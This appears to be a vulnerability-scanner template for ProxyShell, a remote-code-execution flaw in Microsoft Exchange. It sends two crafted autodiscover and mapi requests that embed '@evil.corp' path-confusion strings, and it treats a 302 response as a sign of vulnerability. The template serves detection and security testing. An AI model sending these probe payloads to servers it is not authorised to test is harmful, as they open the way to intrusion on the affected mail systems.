id: ProxyShell

info:
  author: Udyz
  name: ProxyShell
  description: ProxyShell allow attacker rce on microsoft exchange server
  severity: medium
  tags: proxyshell,rce
  reference: |
      - https://twitter.com/haxor31337/status/1424661943751634945/photo/1

requests:
  - method: GET
    path:
      - '{{BaseURL}}/autodiscover/autodiscover.json?@evil.corp/owa/?&Email=autodiscover/autodiscover.json%3F@evil.corp'
      - '{{BaseURL}}/mapi/nspi/?@evil.corp/owa/?&Email=autodiscover/autodiscover.json%3F@evil.corp'
      
    matchers:
      - type: status
        status:
          - 302
